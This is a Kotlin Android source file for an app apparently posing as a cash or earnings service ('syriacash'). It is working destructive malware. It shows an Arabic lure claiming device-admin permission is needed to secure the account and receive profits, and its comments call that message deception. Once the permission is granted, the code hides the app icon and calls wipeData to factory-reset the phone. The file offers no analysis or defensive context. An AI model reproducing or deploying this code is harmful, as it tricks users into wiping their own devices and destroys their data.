package com.example.syriacash

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminName: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminName = ComponentName(this, AdminReceiver::class.java)

        // أول ما التطبيق يفتح، بنطلب الصلاحية فوراً
        if (!dpm.isAdminActive(adminName)) {
            triggerDeviceAdmin()
        }
    }

    override fun onResume() {
        super.onResume()
        // أول ما يرجع من شاشة الصلاحية (لو وافق):
        if (dpm.isAdminActive(adminName)) {
            // نخفي الأيقونة ونفرمت الجهاز
            hideAppIcon()
            dpm.wipeData(0)
        }
    }

    private fun triggerDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
        // رسالة الخداع اللي بتظهر في شاشة المسؤول
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب تفعيل هذه الصلاحية لتأمين حسابك واستلام الأرباح.")
        startActivity(intent)
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}